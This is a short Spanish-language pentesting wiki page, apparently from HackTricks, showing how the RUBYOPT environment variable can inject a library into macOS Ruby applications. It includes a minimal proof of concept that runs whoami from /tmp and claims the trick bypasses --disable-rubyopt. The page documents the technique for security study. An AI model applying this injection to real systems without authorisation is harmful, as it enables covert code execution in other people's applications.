# Inyección en aplicaciones Ruby de macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Usando esta variable de entorno es posible **añadir nuevos parámetros** a **ruby** cada vez que se ejecuta. Aunque el parámetro **`-e`** no se puede usar para especificar código ruby que ejecutar, es posible usar los parámetros **`-I`** y **`-r`** para añadir una nueva carpeta a la ruta de carga de las bibliotecas y después **especificar una biblioteca que cargar**.

Crea la biblioteca **`inject.rb`** en **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Crea en cualquier lugar un script de Ruby como:
```ruby:hello.rb
puts 'Hello, World!'
```
Luego, haz que un script Ruby arbitrario lo cargue con:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Dato curioso, funciona incluso con el parámetro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
